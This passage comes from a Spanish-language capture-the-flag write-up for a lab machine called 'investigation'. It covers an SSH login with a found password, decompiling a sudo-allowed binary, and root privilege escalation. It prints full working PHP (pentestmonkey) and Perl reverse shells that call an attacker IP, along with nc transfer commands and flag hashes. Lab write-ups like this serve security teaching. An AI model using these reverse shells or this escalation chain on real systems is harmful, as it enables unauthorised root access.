+<span class="hljs-tag">&lt;<span class="hljs-name">Data</span> <span class="hljs-attr">Name</span>=<span class="hljs-string">"AuthenticationPackageName"</span>&gt;</span>Negotiate<span class="hljs-tag">&lt;/<span class="hljs-name">Data</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">Data</span> <span class="hljs-attr">Name</span>=<span class="hljs-string">"WorkstationName"</span>&gt;</span>EFORENZICS-DI<span class="hljs-tag">&lt;/<span class="hljs-name">Data</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">Data</span> <span class="hljs-attr">Name</span>=<span class="hljs-string">"TransmittedServices"</span>&gt;</span>-<span class="hljs-tag">&lt;/<span class="hljs-name">Data</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">Data</span> <span class="hljs-attr">Name</span>=<span class="hljs-string">"LmPackageName"</span>&gt;</span>-<span class="hljs-tag">&lt;/<span class="hljs-name">Data</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">Data</span> <span class="hljs-attr">Name</span>=<span class="hljs-string">"KeyLength"</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">Data</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">Data</span> <span class="hljs-attr">Name</span>=<span class="hljs-string">"ProcessId"</span>&gt;</span>0x0000000000000180<span class="hljs-tag">&lt;/<span class="hljs-name">Data</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">Data</span> <span class="hljs-attr">Name</span>=<span class="hljs-string">"ProcessName"</span>&gt;</span>C:\Windows\System32\svchost.exe<span class="hljs-tag">&lt;/<span class="hljs-name">Data</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">Data</span> <span class="hljs-attr">Name</span>=<span class="hljs-string">"IpAddress"</span>&gt;</span>127.0.0.1<span class="hljs-tag">&lt;/<span class="hljs-name">Data</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">Data</span> <span class="hljs-attr">Name</span>=<span class="hljs-string">"IpPort"</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">Data</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">EventData</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">Event</span>&gt;</span></span>
+</code></pre><p>Por lo que probamos a conectarnos mediante ssh con el usuario <strong>smorton</strong> con la credencial encontrada (<em>Def@ultf0r3nz!csPa$$</em>), consiguiendo así acceso al sistema con dicho usuario.</p>
+<pre><code><span class="hljs-selector-tag">ssh</span> <span class="hljs-selector-tag">smorton</span>@<span class="hljs-keyword">10</span>.<span class="hljs-keyword">10</span>.<span class="hljs-keyword">11</span>.<span class="hljs-keyword">197</span>
+</code></pre><p>&nbsp;</p>
+<h2 id="12-obtenci-n-del-flag">12. Flag de usuario</h2>
+<p>Somos capaces de obtener la flag de usuario -&gt; <em>cc43a54c052064689046a61b4a07d887</em></p>
+<p>&nbsp;</p>
+<h2 id="13-observamos-los-suid-binaries">13. Observamos los SUID binaries</h2>
+<p>Empezamos la escalada de privilegios observando los SUID binaries que dispone el usuario <strong>smorton</strong>, utilizando para ello el  comando <strong># sudo -l</strong>, observando lo siguiente:</p>
+<pre><code>Matching Defaults entries <span class="hljs-keyword">for</span> smorton on <span class="hljs-symbol">investigation:</span>
+env_reset, mail_badpass,
+secure_path=<span class="hljs-regexp">/usr/local</span><span class="hljs-regexp">/sbin\:/usr</span><span class="hljs-regexp">/local/bin</span>\<span class="hljs-symbol">:/usr/sbin</span>\<span class="hljs-symbol">:/usr/bin</span>\<span class="hljs-symbol">:/sbin</span>\<span class="hljs-symbol">:/bin</span>\<span class="hljs-symbol">:/snap/bin</span>
+
+User smorton may run the following commands on <span class="hljs-symbol">investigation:</span>
+    (root) <span class="hljs-symbol">NOPASSWD:</span> /usr/bin/binary
+</code></pre><p>Dicho archivo se trata de un binario, el cual si lo ejecutamos obtenemos lo siguiente:</p>
+<pre><code><span class="hljs-comment">% /usr/bin/binary</span>
+    Exiting...
+</code></pre><p>Por lo que se nos puede ocurrir decompilarlo para observar que contiene. Para ello lo pasamos a nuestra máquina host mediante nc:</p>
+<pre><code>% nc -w <span class="hljs-number">3</span> <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.68</span> <span class="hljs-number">1234</span> &lt; binary
+
+# nc -l -p <span class="hljs-number">1234</span> &gt; binary
+</code></pre><p>&nbsp;</p>
+<h2 id="14-decompilaci-n-del-archivo">14. Decompilación del archivo</h2>
+<p>Podemos decompilarlo por ejemplo mediante ghydra, o directamente mediante un decompilador online como <a href="https://dogbolt.org/">https://dogbolt.org/</a></p>
+<p>Una vez decompilado podemos observar la siguiente función:</p>
+<pre><code> <span class="hljs-keyword">if</span> (param_1 != <span class="hljs-number">3</span>) {
+    puts(<span class="hljs-string">"Exiting... "</span>);
+                    <span class="hljs-regexp">//</span> WARNING: Subroutine does not return
+    <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);
+  }
+  _Var1 = getuid();
+  <span class="hljs-keyword">if</span> (_Var1 != <span class="hljs-number">0</span>) {
+    puts(<span class="hljs-string">"Exiting... "</span>);
+                    <span class="hljs-regexp">//</span> WARNING: Subroutine does not return
+    <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);
+  }
+  iVar2 = strcmp(*(char **)(param_2 + <span class="hljs-number">0</span>x10),<span class="hljs-string">"lDnxUysaQn"</span>);
+  <span class="hljs-keyword">if</span> (iVar2 != <span class="hljs-number">0</span>) {
+    puts(<span class="hljs-string">"Exiting... "</span>);
+                    <span class="hljs-regexp">//</span> WARNING: Subroutine does not return
+    <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);
+  }
+  puts(<span class="hljs-string">"Running... "</span>);
+  __stream = fopen(*(char **)(param_2 + <span class="hljs-number">0</span>x10),<span class="hljs-string">"wb"</span>);
+  uVar3 = curl_easy_init();
+  curl_easy_setopt(uVar3,<span class="hljs-number">0</span>x2712,*(undefined8 *)(param_2 + <span class="hljs-number">8</span>));
+  curl_easy_setopt(uVar3,<span class="hljs-number">0</span>x2711,__stream);
+  curl_easy_setopt(uVar3,<span class="hljs-number">0</span>x2d,<span class="hljs-number">1</span>);
+  iVar2 = curl_easy_perform(uVar3);
+  <span class="hljs-keyword">if</span> (iVar2 == <span class="hljs-number">0</span>) {
+    iVar2 = snprintf((char *)<span class="hljs-number">0</span>x0,<span class="hljs-number">0</span>,<span class="hljs-string">"%s"</span>,*(undefined8 *)(param_2 + <span class="hljs-number">0</span>x10));
+    __s = (char *)malloc((long)iVar2 + <span class="hljs-number">1</span>);
+    snprintf(__s,(long)iVar2 + <span class="hljs-number">1</span>,<span class="hljs-string">"%s"</span>,*(undefined8 *)(param_2 + <span class="hljs-number">0</span>x10));
+    iVar2 = snprintf((char *)<span class="hljs-number">0</span>x0,<span class="hljs-number">0</span>,<span class="hljs-string">"perl ./%s"</span>,__s);
+    __s_00 = (char *)malloc((long)iVar2 + <span class="hljs-number">1</span>);
+    snprintf(__s_00,(long)iVar2 + <span class="hljs-number">1</span>,<span class="hljs-string">"perl ./%s"</span>,__s);
+    fclose(__stream);
+    curl_easy_cleanup(uVar3);
+    setuid(<span class="hljs-number">0</span>);
+    system(__s_00);
+    system(<span class="hljs-string">"rm -f ./lDnxUysaQn"</span>);
+    return <span class="hljs-number">0</span>;
+  }
+  puts(<span class="hljs-string">"Exiting... "</span>);
+                    <span class="hljs-regexp">//</span> WARNING: Subroutine does not return
+  <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);
+}
+</code></pre><p>En dicha función podemos observar como el <em>script</em> espera recibir tres argumentos. El tercer argumento tiene que ser la cadena <em>lDnxUysaQn</em>. Mientras que al segundo parámetro le va a realizar una petición mediante la herramienta curl. Por lo que podemos intentar obtener una petición web en nuestro equipo, mediante los siguientes comandos:</p>
+<pre><code>% <span class="hljs-selector-tag">sudo</span> <span class="hljs-selector-tag">binary</span> 10<span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.14</span><span class="hljs-selector-class">.68</span><span class="hljs-selector-pseudo">:1234</span> <span class="hljs-selector-tag">lDnxUysaQn</span>
+</code></pre><p>En nuestra máquina ejecutamos lo siguiente:</p>
+<pre><code><span class="hljs-meta"># sudo python -m http.server 1234</span>
+</code></pre><p>Observando que recibimos la siguiente petición:</p>
+<pre><code>Serving HTTP on <span class="hljs-number">0.0.0.0</span> port <span class="hljs-number">1234</span> (http://<span class="hljs-number">0.0.0.0:1234</span>/) ...
+<span class="hljs-number">10.10.11.197</span> - - <span class="hljs-string">[08/Mar/2023 11:56:37]</span> <span class="hljs-string">"<span class="hljs-keyword">GET</span> / HTTP/1.1"</span> <span class="hljs-number">200</span> -
+</code></pre><p>&nbsp;</p>
+<h2 id="15-intentamos-servir-una-revershell">15. Intentamos servir una revershell</h2>
+<p>Esto lo podemos realizar mediante un archivo <em>php</em>, por ejemplo utilizando para ello la revershell de <strong>pentestmonkey</strong>:</p>
+<pre><code><span class="php"><span class="hljs-meta">&lt;?php</span>
+
+set_time_limit (<span class="hljs-number">0</span>);
+$VERSION = <span class="hljs-string">"1.0"</span>;
+$ip = <span class="hljs-string">'10.10.14.68'</span>;  <span class="hljs-comment">// CHANGE THIS</span>
+$port = <span class="hljs-number">1234</span>;       <span class="hljs-comment">// CHANGE THIS</span>
+$chunk_size = <span class="hljs-number">1400</span>;
+$write_a = <span class="hljs-keyword">null</span>;
+$error_a = <span class="hljs-keyword">null</span>;
+$shell = <span class="hljs-string">'uname -a; w; id; /bin/sh -i'</span>;
+$daemon = <span class="hljs-number">0</span>;
+$debug = <span class="hljs-number">0</span>;
+
+<span class="hljs-comment">//</span>
+<span class="hljs-comment">// Daemonise ourself if possible to avoid zombies later</span>
+<span class="hljs-comment">//</span>
+
+<span class="hljs-comment">// pcntl_fork is hardly ever available, but will allow us to daemonise</span>
+<span class="hljs-comment">// our php process and avoid zombies.  Worth a try...</span>
+<span class="hljs-keyword">if</span> (function_exists(<span class="hljs-string">'pcntl_fork'</span>)) {
+    <span class="hljs-comment">// Fork and have the parent process exit</span>
+    $pid = pcntl_fork();
+
+    <span class="hljs-keyword">if</span> ($pid == <span class="hljs-number">-1</span>) {
+        printit(<span class="hljs-string">"ERROR: Can't fork"</span>);
+        <span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);
+    }
+
+    <span class="hljs-keyword">if</span> ($pid) {
+        <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);  <span class="hljs-comment">// Parent exits</span>
+    }
+
+    <span class="hljs-comment">// Make the current process a session leader</span>
+    <span class="hljs-comment">// Will only succeed if we forked</span>
+    <span class="hljs-keyword">if</span> (posix_setsid() == <span class="hljs-number">-1</span>) {
+        printit(<span class="hljs-string">"Error: Can't setsid()"</span>);
+        <span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);
+    }
+
+    $daemon = <span class="hljs-number">1</span>;
+} <span class="hljs-keyword">else</span> {
+    printit(<span class="hljs-string">"WARNING: Failed to daemonise.  This is quite common and not fatal."</span>);
+}
+
+<span class="hljs-comment">// Change to a safe directory</span>
+chdir(<span class="hljs-string">"/"</span>);
+
+<span class="hljs-comment">// Remove any umask we inherited</span>
+umask(<span class="hljs-number">0</span>);
+
+<span class="hljs-comment">//</span>
+<span class="hljs-comment">// Do the reverse shell...</span>
+<span class="hljs-comment">//</span>
+
+<span class="hljs-comment">// Open reverse connection</span>
+$sock = fsockopen($ip, $port, $errno, $errstr, <span class="hljs-number">30</span>);
+<span class="hljs-keyword">if</span> (!$sock) {
+    printit(<span class="hljs-string">"$errstr ($errno)"</span>);
+    <span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);
+}
+
+<span class="hljs-comment">// Spawn shell process</span>
+$descriptorspec = <span class="hljs-keyword">array</span>(
+   <span class="hljs-number">0</span> =&gt; <span class="hljs-keyword">array</span>(<span class="hljs-string">"pipe"</span>, <span class="hljs-string">"r"</span>),  <span class="hljs-comment">// stdin is a pipe that the child will read from</span>
+   <span class="hljs-number">1</span> =&gt; <span class="hljs-keyword">array</span>(<span class="hljs-string">"pipe"</span>, <span class="hljs-string">"w"</span>),  <span class="hljs-comment">// stdout is a pipe that the child will write to</span>
+   <span class="hljs-number">2</span> =&gt; <span class="hljs-keyword">array</span>(<span class="hljs-string">"pipe"</span>, <span class="hljs-string">"w"</span>)   <span class="hljs-comment">// stderr is a pipe that the child will write to</span>
+);
+
+$process = proc_open($shell, $descriptorspec, $pipes);
+
+<span class="hljs-keyword">if</span> (!is_resource($process)) {
+    printit(<span class="hljs-string">"ERROR: Can't spawn shell"</span>);
+    <span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);
+}
+
+<span class="hljs-comment">// Set everything to non-blocking</span>
+<span class="hljs-comment">// Reason: Occsionally reads will block, even though stream_select tells us they won't</span>
+stream_set_blocking($pipes[<span class="hljs-number">0</span>], <span class="hljs-number">0</span>);
+stream_set_blocking($pipes[<span class="hljs-number">1</span>], <span class="hljs-number">0</span>);
+stream_set_blocking($pipes[<span class="hljs-number">2</span>], <span class="hljs-number">0</span>);
+stream_set_blocking($sock, <span class="hljs-number">0</span>);
+
+printit(<span class="hljs-string">"Successfully opened reverse shell to $ip:$port"</span>);
+
+<span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) {
+    <span class="hljs-comment">// Check for end of TCP connection</span>
+    <span class="hljs-keyword">if</span> (feof($sock)) {
+        printit(<span class="hljs-string">"ERROR: Shell connection terminated"</span>);
+        <span class="hljs-keyword">break</span>;
+    }
+
+    <span class="hljs-comment">// Check for end of STDOUT</span>
+    <span class="hljs-keyword">if</span> (feof($pipes[<span class="hljs-number">1</span>])) {
+        printit(<span class="hljs-string">"ERROR: Shell process terminated"</span>);
+        <span class="hljs-keyword">break</span>;
+    }
+
+    <span class="hljs-comment">// Wait until a command is end down $sock, or some</span>
+    <span class="hljs-comment">// command output is available on STDOUT or STDERR</span>
+    $read_a = <span class="hljs-keyword">array</span>($sock, $pipes[<span class="hljs-number">1</span>], $pipes[<span class="hljs-number">2</span>]);
+    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, <span class="hljs-keyword">null</span>);
+
+    <span class="hljs-comment">// If we can read from the TCP socket, send</span>
+    <span class="hljs-comment">// data to process's STDIN</span>
+    <span class="hljs-keyword">if</span> (in_array($sock, $read_a)) {
+        <span class="hljs-keyword">if</span> ($debug) printit(<span class="hljs-string">"SOCK READ"</span>);
+        $input = fread($sock, $chunk_size);
+        <span class="hljs-keyword">if</span> ($debug) printit(<span class="hljs-string">"SOCK: $input"</span>);
+        fwrite($pipes[<span class="hljs-number">0</span>], $input);
+    }
+
+    <span class="hljs-comment">// If we can read from the process's STDOUT</span>
+    <span class="hljs-comment">// send data down tcp connection</span>
+    <span class="hljs-keyword">if</span> (in_array($pipes[<span class="hljs-number">1</span>], $read_a)) {
+        <span class="hljs-keyword">if</span> ($debug) printit(<span class="hljs-string">"STDOUT READ"</span>);
+        $input = fread($pipes[<span class="hljs-number">1</span>], $chunk_size);
+        <span class="hljs-keyword">if</span> ($debug) printit(<span class="hljs-string">"STDOUT: $input"</span>);
+        fwrite($sock, $input);
+    }
+
+    <span class="hljs-comment">// If we can read from the process's STDERR</span>
+    <span class="hljs-comment">// send data down tcp connection</span>
+    <span class="hljs-keyword">if</span> (in_array($pipes[<span class="hljs-number">2</span>], $read_a)) {
+        <span class="hljs-keyword">if</span> ($debug) printit(<span class="hljs-string">"STDERR READ"</span>);
+        $input = fread($pipes[<span class="hljs-number">2</span>], $chunk_size);
+        <span class="hljs-keyword">if</span> ($debug) printit(<span class="hljs-string">"STDERR: $input"</span>);
+        fwrite($sock, $input);
+    }
+}
+
+fclose($sock);
+fclose($pipes[<span class="hljs-number">0</span>]);
+fclose($pipes[<span class="hljs-number">1</span>]);
+fclose($pipes[<span class="hljs-number">2</span>]);
+proc_close($process);
+
+<span class="hljs-comment">// Like print, but does nothing if we've daemonised ourself</span>
+<span class="hljs-comment">// (I can't figure out how to redirect STDOUT like a proper daemon)</span>
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">printit</span> <span class="hljs-params">($string)</span> </span>{
+    <span class="hljs-keyword">if</span> (!$daemon) {
+        <span class="hljs-keyword">print</span> <span class="hljs-string">"$string\n"</span>;
+    }
+}
+
+<span class="hljs-meta">?&gt;</span></span>
+</code></pre><p>Si lanzamos un nc en nuestro equipo escuchando, a mayores de un servidor web alojando dicho archivo, y realizamos la petición observamos que el binario tiene como salida el siguiente error:</p>
+<pre><code>smorton<span class="hljs-variable">@investigation</span><span class="hljs-symbol">:/usr/bin</span><span class="hljs-variable">$ </span>sudo binary <span class="hljs-number">10.10</span>.<span class="hljs-number">14.68</span><span class="hljs-symbol">:</span><span class="hljs-number">80</span>/php-reverse-shell.php lDnxUysaQn
+    Running... 
+    Unterminated &lt;&gt; operator at ./lDnxUysaQn line <span class="hljs-number">1</span>.
+</code></pre><p>Decidimos entonces ejecutar un revershell basada en <strong>perl</strong>, creando para ello el siguiente archivo llamado <em>perl.pl</em>:</p>
+<pre><code><span class="hljs-keyword">use</span> Socket;
+$i=<span class="hljs-string">"10.10.14.68"</span>;
+$p=<span class="hljs-number">1234</span>;
+<span class="hljs-keyword">socket</span>(S,PF_INET,SOCK_STREAM,<span class="hljs-keyword">getprotobyname</span>(<span class="hljs-string">"tcp"</span>));
+<span class="hljs-keyword">if</span>(<span class="hljs-keyword">connect</span>(S,sockaddr_in($p,inet_aton($i)))){
+ <span class="hljs-keyword">open</span>(STDIN,<span class="hljs-string">"&gt;&amp;S"</span>);<span class="hljs-keyword">open</span>(STDOUT,<span class="hljs-string">"&gt;&amp;S"</span>);
+ <span class="hljs-keyword">open</span>(STDERR,<span class="hljs-string">"&gt;&amp;S"</span>);<span class="hljs-keyword">exec</span>(<span class="hljs-string">"/bin/bash -i"</span>);
+};
+</code></pre><p>Lanzamos de nuevo un servidor web (en nuestro basado en python), en nuestra máquina host, para que la maquina objetivo pueda obtener el archivo <em>.pl</em></p>
+<pre><code><span class="hljs-meta"># sudo python -m http.server 80 --directory .</span>
+</code></pre><p>A mayores en nuestra máquina host, también lanzamos un <em>nc</em> escuchando:</p>
+<pre><code><span class="hljs-meta"># nc -l -p 1234</span>
+</code></pre><p>Por último realizamos la siguiente peticion desde la máquina objetivo:</p>
+<pre><code>% sudo /usr/bin/binary <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.68</span>/perl.pl lDnxUysaQn
+</code></pre><p>Vemos entonces que se nos crea una revershell con el usuario <strong>root</strong>.</p>
+<p>&nbsp;</p>
+<h2 id="16-obtenci-n-del-flag-">16. Obtención flag usuario root</h2>
+<p>Somos entonces capaces de obtener el flag del usuario <strong>root</strong> -&gt; <em>ddafdb970a1d54bcaad4478c5e300056</em></p>
+
+
+
+
+
+
+
+<p>&nbsp;</p><p>&nbsp;</p>
+</div>
+     <div class="footer-credits" style="display: flex; justify-content: flex-end">
+        <a> Made by Juan González </a>
+    </div>
+</div>
+</body></html>
+
